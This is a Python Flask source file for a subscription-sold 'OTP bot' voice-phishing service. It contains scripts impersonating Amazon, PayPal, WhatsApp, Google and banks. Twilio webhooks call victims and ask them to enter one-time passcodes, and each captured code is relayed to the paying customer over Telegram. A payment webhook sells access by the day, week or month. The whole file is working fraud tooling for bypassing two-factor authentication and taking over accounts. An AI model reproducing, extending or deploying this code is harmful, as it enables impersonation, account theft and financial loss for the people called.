from flask import Flask, request, jsonify, Response
from threading import Thread
from database import add_subscription_days
from config import bot
from twilio.twiml.voice_response import VoiceResponse, Gather
from logger import send_log, log_error 
import json

app = Flask('')

# ==========================================
# 📜 DICCIONARIO DE GUIONES (SCRIPTS)
# ==========================================
# Aquí defines qué dice la voz para cada servicio.
# Puedes añadir más servicios copiando el formato.
SCRIPTS = {
    "amazon": (
        "Hello. This is Amazon Security Department. "
        "We detected a suspicious purchase of an iPhone 15 Pro for $1,200 USD on your account. "
        "If this was not you, please enter the 6-digit OTP code sent to your mobile device to cancel this order immediately."
    ),
    "paypal": (
        "Hello. This is an automated alert from PayPal Fraud Prevention. "
        "A login attempt was made from a new device in Russia. "
        "To block this sign-in, please enter the security code sent to your text messages now."
    ),
    "whatsapp": (
        "Hi. This is WhatsApp Support. "
        "Someone is trying to register your number on a new device. "
        "To prevent account theft, please enter the verification code displayed on your screen."
    ),
    "google": (
        "This is Google Security. "
        "We blocked a sign-in attempt to your Gmail account. "
        "Please enter the Google verification code to secure your account."
    ),
    "bank": (
        "Hello. This is the Fraud Department of your bank. "
        "We noticed an unusual withdrawal request. "
        "Please key in the one-time passcode sent to your phone to authorize or reject this transaction."
    ),
    # ⚠️ DEFAULT: Esto se usa si el servicio no está en la lista de arriba
    "default": (
        "Hello. This is an automated security call from {service}. "
        "We detected unauthorized activity on your account. "
        "Please enter the verification code sent to your mobile device to verify your identity."
    )
}

@app.route('/')
def home():
    return "Mussolini OTP Bot - Voice Engine Online."

# ==========================================
# 1. WEBHOOK HOODPAY (PAGOS)
# ==========================================
@app.route('/webhook/hoodpay', methods=['POST'])
def hoodpay_webhook():
    try:
        data = request.json
        status = data.get("status", "").upper()
        
        if status in ["COMPLETED", "PAID", "SUCCESS"]:
            metadata = data.get("metadata", {})
            user_id = metadata.get("user_id")
            plan_type = metadata.get("plan_type")
            
            if user_id and plan_type:
                # Lógica de días
                days = 1
                if "weekly" in plan_type: days = 7
                elif "monthly" in plan_type: days = 30
                
                success, new_date = add_subscription_days(user_id, days)
                
                if success:
                    try:
                        bot.send_message(user_id, f"✅ **Payment Received!**\nPlan `{plan_type}` active.", parse_mode="Markdown")
                        send_log(f"Pago Recibido: User {user_id} - Plan {plan_type}", level="PAYMENT")
                    except: pass
                
                return jsonify({"status": "success"}), 200
        return jsonify({"status": "ignored"}), 200
    except Exception as e:
        log_error(e, "Hoodpay Webhook")
        return jsonify({"status": "error"}), 500

# ==========================================
# 2. WEBHOOK TWILIO - GENERADOR DE VOZ
# ==========================================
@app.route('/twilio/voice', methods=['POST'])
def twilio_voice():
    """Twilio pregunta: ¿Qué le digo a la víctima?"""
    # Obtenemos el servicio que puso el usuario (ej: Amazon, PayPal)
    service_raw = request.args.get('service', 'Security')
    user_id = request.args.get('user_id')
    
    # Normalizamos el nombre (todo a minúsculas) para buscarlo en el diccionario
    service_key = service_raw.lower()
    
    # BUSCAMOS EL GUIÓN CORRECTO
    if service_key in SCRIPTS:
        # Si existe (ej: amazon), usamos ese texto específico
        say_text = SCRIPTS[service_key]
    else:
        # Si no existe, usamos el "default" y le pegamos el nombre del servicio
        say_text = SCRIPTS["default"].format(service=service_raw)
    
    resp = VoiceResponse()
    
    # Configuración de captura (DTMF)
    gather = Gather(num_digits=8, action=f'/twilio/gather?user_id={user_id}&service={service_raw}', method='POST', timeout=10)
    
    # Alice es la voz de mujer estándar de Twilio (en inglés US)
    gather.say(say_text, voice='alice', language='en-US')
    
    resp.append(gather)
    
    # Si la víctima no hace nada, repetimos o colgamos
    resp.say("We did not receive any input. Goodbye.", voice='alice')
    
    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 3. WEBHOOK TWILIO - CAPTURA DE CÓDIGO
# ==========================================
@app.route('/twilio/gather', methods=['POST'])
def twilio_gather():
    digits = request.values.get('Digits')
    user_id = request.args.get('user_id')
    service = request.args.get('service')
    
    resp = VoiceResponse()

    if digits and user_id:
        # 1. Enviar el código a Telegram
        try:
            bot.send_message(user_id, f"🎹 **OTP CAPTURED!**\n👤 Service: {service}\n🔢 Code: `{digits}`", parse_mode="Markdown")
            send_log(f"OTP Capturado para {user_id}: {digits}", level="SUCCESS")
        except: pass

        # 2. Mensaje final a la víctima
        resp.say("Thank you. Your account has been verified.", voice='alice')
    else:
        resp.say("Invalid input.", voice='alice')

    return Response(str(resp), mimetype='text/xml')

def run():
    app.run(host='0.0.0.0', port=8080)

def start_server():
    t = Thread(target=run)
    t.start()
